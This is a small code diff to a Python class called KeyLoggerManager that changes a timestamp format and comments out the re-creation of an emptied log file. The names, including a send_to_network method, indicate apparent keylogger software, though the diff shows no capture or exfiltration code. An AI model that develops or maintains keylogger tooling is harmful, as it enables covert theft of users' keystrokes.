@@ -34,7 +34,7 @@ class KeyLoggerManager:
 
     def get_hour_timestamp(self):
         now = datetime.datetime.now()
-        hour_timestamp = now.replace(minute=0, second=0, microsecond=0)
+        hour_timestamp = now.replace(second=0, microsecond=0)
         return str(hour_timestamp)
 
     def send_to_network(self):
@@ -46,8 +46,8 @@ class KeyLoggerManager:
             os.remove(self.file_path)
             self.timestamp = self.get_hour_timestamp()
 
-            with open(self.file_path, "w") as file:
-                json.dump({}, file)
+            # with open(self.file_path, "w") as file:
+            #     json.dump({}, file)
 
 
 
